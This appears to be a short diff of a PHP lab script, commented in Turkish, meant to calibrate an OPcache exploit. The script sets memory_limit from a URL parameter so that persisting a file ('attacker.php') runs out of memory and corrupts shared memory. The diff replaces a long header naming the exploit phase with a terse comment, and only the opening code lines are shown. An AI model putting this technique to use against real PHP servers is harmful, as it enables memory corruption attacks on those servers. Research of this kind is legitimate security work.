@@ -1,18 +1,6 @@
 <?php
-/**
- * Bug 4 Lab: OPcache Persist Trigger + OOM Calibration
- *
- * Bu script:
- *  1. Verilen memory_limit degerini runtime'da ayarlar
- *  2. Buyuk bir PHP dosyasini opcache_compile_file() ile persist etmeye calisir
- *  3. memory_limit dolunca OOM olur → persist() yarim kalir → SHM corruption
- *
- * Exploit'in Phase 2 (Calibration) asamasinda kullanilir.
- * ?ml=<bytes> parametresiyle memory_limit kontrol edilir.
- * ?target=<path> ile persist edilecek dosya belirtilir.
- *
- * SADECE LAB.
- */
+// Kalibrasyon: ?ml=<bytes> ile memory_limit ayarla, attacker.php'yi persist et.
+// OOM olursa persist yarim kalir → SHM corruption.
 header('Content-Type: application/json');
 
 $ml = isset($_GET['ml']) ? (int)$_GET['ml'] : 4 * 1024 * 1024;
